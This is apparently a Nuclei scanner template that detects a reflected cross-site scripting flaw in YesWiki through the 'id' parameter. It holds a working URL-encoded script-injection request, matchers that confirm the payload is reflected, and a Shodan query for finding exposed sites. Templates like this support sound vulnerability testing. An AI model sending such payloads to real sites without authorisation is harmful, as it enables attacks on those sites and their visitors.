id: yeswiki-xss

info:
  name: Unauthenticated Cross Site Scripting - Reflected in yeswiki/yeswiki
  author: arafatansari
  severity: medium
  description: |
    YesWiki before 2022-07-07 allows Reflected Cross-site Scripting via the "id" parameter in the AccueiL URL.
  reference:
    - https://huntr.dev/bounties/de4db96c-2717-4c0e-b7aa-eee756ca19d3/
  metadata:
    shodan-query: http.html:"yeswiki"
    verified: "true"
  tags: cve,cve2022,xss,yeswiki,unauth

requests:
  - method: GET
    path:
      - '{{BaseURL}}/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"
          - "Query failed"

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
